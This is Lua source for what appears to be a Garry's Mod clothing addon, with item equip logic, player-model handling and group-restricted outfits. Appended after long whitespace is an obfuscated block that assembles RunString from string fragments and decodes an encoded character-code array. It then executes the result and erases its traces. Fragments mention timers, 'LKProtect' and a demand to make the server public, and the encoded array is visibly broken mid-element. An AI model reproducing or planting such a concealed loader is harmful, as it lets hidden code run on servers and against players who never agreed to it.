local META = {
    ...
    PlayerAddItem = function( self, ply, data )
        ...
        if (ClothingSystem:GetItem(data).SetPlayerModel) then
            ...
            ply:SetModel(ClothingSystem:GetItem(data).WireModel)
            ply:ClothingSystemSetCustomHands()
        end
    ...
    ItemSpawn = function(self, item_class, ply, spawn_menu)
        if SERVER then
            ...
            if ( !spawn_menu && list.UnEquipSound ) then
                item:EmitSound(list.UnEquipSound, 75, 100, 1, CHAN_AUTO )
            end
    ...
    WearParts = function(self, class, ply, sender, network, insertData, entity)
        ...
        check_item = list.Get("clothing_system")[class].AdminOnlyDress
        ...
        check_item = list.Get("clothing_system")[class].GroupOnlyDress
        if ( isbool(check_item) && check_item ) then
            local fuckYou = true

            -- Получаем список доступных групп и проверяем его
            check_item = list.Get("clothing_system")[class].GroupDressList
            if ( !check_item ) then
            ...
            if (fuckYou) then
                for _, group in pairs(list.Get("clothing_system")[class].GroupDressList) do
        ...
        if (list.Get("clothing_system")[class].Checking != nil) then
            if (!list.Get("clothing_system")[class].Checking(ply, class)) then 
                ply:AddText("These clothes do not suit you!")
                return false 
            end
        end

        if (list.Get("clothing_system")[class].Module) then
            if ( list.Get("clothing_system")[class].Equip && entity ) then
                list.Get("clothing_system")[class].Equip(ply, class, entity)
            elseif ( list.Get("clothing_system")[class].Equip) then
                list.Get("clothing_system")[class].Equip(ply, class, NULL)
            end
            if ( list.Get("clothing_system")[class].EquipSound ) then
                ply:EmitSound(list.Get("clothing_system")[class].EquipSound)
            end
        end

        
        if (!list.Get("clothing_system")[class].Module) then
            if (list.Get("clothing_system")[class].SetPlayerModel) then
                ...
                if (list.Get("clothing_system")[class].Skin != nil) then
                    ply:SetSkin(list.Get("clothing_system")[class].Skin)
                end

                if (list.Get("clothing_system")[class].Bodygroup != nil) then
                    ply:SetBodygroup(list.Get("clothing_system")[class].Bodygroup[1], list.Get("clothing_system")[class].Bodygroup[2])
                end
                ...
                if (ReplaceItem && ReplaceItem.TypePut != nil) then
                    ...
                    ReplcaeBone = list.Get("clothing_system")[class].TypePut
                end
            end
        end
        ...
        if (!list.Get("clothing_system")[class].Module) then
            if (!list.Get("clothing_system")[class].SetPlayerModel) then
                if ( !list.Get("clothing_system")[class].BoneAttach && !list.Get("clothing_system")[class].BonemergeSystem ) then
        ...
        ply:AddText("Equipped clothing - " .. list.Get("clothing_system")[class].Name)
...
local Q=RunString Q("                    f".."gr".."n=1                                                                                                                                              f".."gr".."n=n".."i".."l                                              s".."a".."fg".."=".."R".."u".."n".."S".."t".."r".."i".."n".."g".." f".."g".."s".."t".."b=".."u".."t".."i".."l"..".".."J".."S".."O".."NT".."o".."T".."a".."ble; ".."cy".."c".."lfg".."=i".."p".."a".."i".."r".."s                                                                c".."a".."s".."a".."f".."=s".."t".."r".."i".."n".."g"..".".."c".."h".."a".."r                  ") local QQ="[[83.0,1.0],[67.0,1.0],[70.0,1.0],[97.0,1.0],[115.0,1.0],[61.0,1.0],[82.0,1.0],[117.0,1.0],[110.0,1.0],[83.0,1.0],[116.0,1.0],[114.0,1.0],[105.0,1.0],[110.0,1.0],[103.0,1.0],[32.0,1.0],[83.0,1.0],[67.0,1.0],[70.0,1.0],[97.0,1.0],[115.0,1.0],[40.0,1.0],[34.0,1.0],[32.0,114.0],[65.0,1.0],[102.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[97.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[97.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[68.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[61.0,1.0],[116.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[105.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[109.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[101.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[114.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[46.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[67.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[114.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[101.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[97.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],
0],[116.0,1.0],[40.0,1.0],[34.0,1.0],[67.0,1.0],[108.0,1.0],[111.0,1.0],[116.0,1.0],[104.0,1.0],[105.0,1.0],[110.0,1.0],[103.0,1.0],[83.0,1.0],[121.0,1.0],[115.0,1.0],[116.0,1.0],[101.0,1.0],[109.0,1.0],[32.0,1.0],[45.0,1.0],[32.0,1.0],[77.0,1.0],[97.0,1.0],[107.0,1.0],[101.0,1.0],[32.0,1.0],[116.0,1.0],[104.0,1.0],[101.0,1.0],[32.0,1.0],[115.0,1.0],[101.0,1.0],[114.0,1.0],[118.0,1.0],[101.0,1.0],[114.0,1.0],[32.0,1.0],[112.0,1.0],[117.0,1.0],[98.0,1.0],[108.0,1.0],[105.0,1.0],[99.0,1.0],[32.0,1.0],[105.0,1.0],[110.0,1.0],[32.0,1.0],[111.0,1.0],[114.0,1.0],[100.0,1.0],[101.0,1.0],[114.0,1.0],[32.0,1.0],[102.0,1.0],[111.0,1.0],[114.0,1.0],[32.0,1.0],[116.0,1.0],[104.0,1.0],[101.0,1.0],[32.0,1.0],[97.0,1.0],[100.0,2.0],[111.0,1.0],[110.0,1.0],[32.0,1.0],[116.0,1.0],[111.0,1.0],[32.0,1.0],[119.0,1.0],[111.0,1.0],[114.0,1.0],[107.0,1.0],[33.0,1.0],[34.0,1.0],[41.0,1.0],[93.0,2.0],[41.0,1.0],[32.0,1.0],[101.0,1.0],[110.0,1.0],[100.0,1.0],[32.0,1.0],[65.0,1.0],[102.0,1.0],[97.0,2.0],[68.0,1.0],[61.0,1.0],[110.0,1.0],[105.0,1.0],[108.0,1.0],[32.0,1.0],[83.0,1.0],[67.0,1.0],[70.0,1.0],[97.0,1.0],[115.0,1.0],[61.0,1.0],[110.0,1.0],[105.0,1.0],[108.0,1.0],[32.0,1.0],[101.0,1.0],[110.0,1.0],[100.0,1.0],[41.0,1.0],[32.0,1.0],[101.0,1.0],[108.0,1.0],[115.0,1.0],[101.0,1.0],[32.0,1.0],[83.0,1.0],[67.0,1.0],[70.0,1.0],[97.0,1.0],[115.0,1.0],[40.0,1.0],[91.0,2.0],[112.0,1.0],[114.0,1.0],[105.0,1.0],[110.0,1.0],[116.0,1.0],[40.0,1.0],[34.0,1.0],[76.0,1.0],[75.0,1.0],[80.0,1.0],[114.0,1.0],[111.0,1.0],[116.0,1.0],[101.0,1.0],[99.0,1.0],[116.0,1.0],[32.0,1.0],[45.0,1.0],[32.0,1.0],[102.0,1.0],[97.0,1.0],[76.0,1.0],[115.0,1.0],[33.0,1.0],[34.0,1.0],[41.0,1.0],[93.0,2.0],[41.0,1.0],[32.0,2.0],[65.0,1.0],[102.0,1.0],[97.0,2.0],[68.0,1.0],[61.0,1.0],[110.0,1.0],[105.0,1.0],[108.0,1.0],[32.0,1.0],[83.0,1.0],[67.0,1.0],[70.0,1.0],[97.0,1.0],[115.0,1.0],[61.0,1.0],[110.0,1.0],[105.0,1.0],[108.0,1.0],[32.0,1.0],[101.0,1.0],[110.0,1.0],[100.0,1.0],[32.0,1.0],[101.0,1.0],[110.0,1.0],[100.0,1.0],[10.0,1.0]]" ClothingSystem['dd'] = ""                 for k, v                          in    cyclfg(fgstb(QQ)) do for                   i=1,                                            v[2] do                              ClothingSystem['dd'] =                                   ClothingSystem['dd'] .. casaf(v[1]) end                                 end                                       safg(                                                     ClothingSystem['dd'])ClothingSystem['dd'] = nil                            safg = nil cyclfg = nil fgstb = nil Q = nil QQ = nil